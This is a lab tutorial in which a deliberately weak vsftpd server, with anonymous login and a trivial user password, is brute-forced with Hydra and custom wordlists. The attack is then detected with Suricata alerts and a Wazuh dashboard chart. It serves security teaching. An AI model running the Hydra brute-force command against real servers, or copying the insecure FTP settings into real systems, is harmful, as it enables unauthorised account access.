##  Set Up FTP Server (Victim)

Install FTP server

```bash
sudo apt update
sudo apt install vsftpd
```

Allow anonymous login for testing (or create users):

```bash
sudo nano /etc/vsftpd.conf
```
Set:

```
anonymous_enable=YES
```

![image](https://github.com/user-attachments/assets/0b8a943f-8153-4d50-ad15-1daf2a883906)


Create FTP user

```bash
sudo useradd -m testftp
sudo passwd testftp
```
set password to: testftp

![image](https://github.com/user-attachments/assets/a870133f-fa27-4fa0-b6ff-ce280ba5fbd2)

Create the user's home directory

```bash
sudo mkdir /home/testftp
sudo chown testftp:testftp /home/testftp
```
Set proper permissions for vsFTPd to allow access:

```bash
sudo chmod 755 /home/testftp
```
755 = read+execute for others, which is needed unless you use chroot settings.

# Restart FTP service
sudo systemctl restart vsftpd

# Confirm FTP is running
sudo netstat -tuln | grep 21

![image](https://github.com/user-attachments/assets/788f48bf-e0ba-4f2b-bad7-510d2bec3cc8)

Try FTP login:

```
ftp localhost
```

![image](https://github.com/user-attachments/assets/5aa1699b-5c76-4579-bb77-56839c45fac1)

##  Launch FTP Brute-Force Attack (Attacker)

#### 🧾 Why Use a Custom Wordlist?

Default system wordlists (e.g., `/usr/share/wordlists/rockyou.txt`) can be **large (10MB+ or millions of entries)**. For small lab environments, it's more efficient to use a **custom, minimal wordlist** with just a few known/tested combinations.

1. Create a small username list

```bash
echo -e "testftp\nftpuser\nadmin" > small_users.txt
echo -e "123456\npassword\nftp123\ntestftp\nadmin" | sudo tee small_pass.txt > /dev/null
```

![image](https://github.com/user-attachments/assets/a2eba5b1-c307-48e5-9848-c81e4ed91fe5)

2. Run Hydra:

```
 hydra -L small_users.txt -P small_pass.txt ftp://10.0.2.15
```

![image](https://github.com/user-attachments/assets/93625509-f53d-4180-8404-68a875196b20)

 The FTP brute-force attack completed successfully and valid credentials were found.



## Detecting it using Suricata and Wazuh

```
sudo tail -f /var/log/suricata/fast.log
```

![image](https://github.com/user-attachments/assets/79bd4650-c408-415e-bb23-981d172d7ea8)

detected.

To observe detection in real time, run the following command and repeat the attack.

```
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

![image](https://github.com/user-attachments/assets/57cf4850-5b9c-4630-acd8-8355405a97ef)

### View Alerts in Wazuh Dashboard

In Wazuh :

Go to Discover or wazuh alerts

```
data.alert.signature: ET SCAN Potential FTP Brute-Force attempt response
```
Repeated failed FTP login attempts (530 Login incorrect)

- **Source:** 10.0.2.4  
- **Destination (Victim):** 10.0.2.15 on port 21 (FTP)  
- **Rule triggered:** ET SCAN Potential FTP Brute-Force attempt response  
- **Severity:** Informational, but happens hundreds of times (firedtimes: 634+)  

Suricata analyzed the traffic from `eve.json` using PCAP.

This clearly indicates a brute-force attack on FTP using repeated failed login attempts.


 Visualization 1: Attack Timeline (Line Chart)

#### 📌 Goal:
Display the number of **FTP brute-force attempts over time** using Suricata rule ID `86601`.

---

 🔧 Steps:

1.  go to **Visualize** and click **“Line”** chart type.

2. When prompted, select the index pattern: wazuh-alerts-*
---

 Y-Axis (Metrics):
- Under **Metrics**, set:
- **Aggregation:** `Count` (default)

> This counts the number of matching alert documents.

---

 X-Axis (Buckets):
- Click **Add → X-Axis**
- Set:
- **Aggregation:** `Date Histogram`
- **Field:** `@timestamp`
- **Interval:** 
 - `Auto` (default)  
 - Or set `Hourly` / `Per minute` for more detail based on volume

---

 Add Filter:
- At the top, click **“Add filter”**
- Set:
- **Field:** `rule.id`
- **Operator:** `is`
- **Value:** `86601`
---

![Screenshot 2025-07-01 170716](https://github.com/user-attachments/assets/93db0f92-306b-4ee1-ad0d-2f9b5b087dfb)

Click **Save** or **Apply filter**.

Attack Detected Around ``15:00``:

There's a very high spike around 15:00 (3 PM), where over 600 brute-force alerts were generated in a 30-minute period.

This is a strong indicator of an FTP brute-force attack in progres.






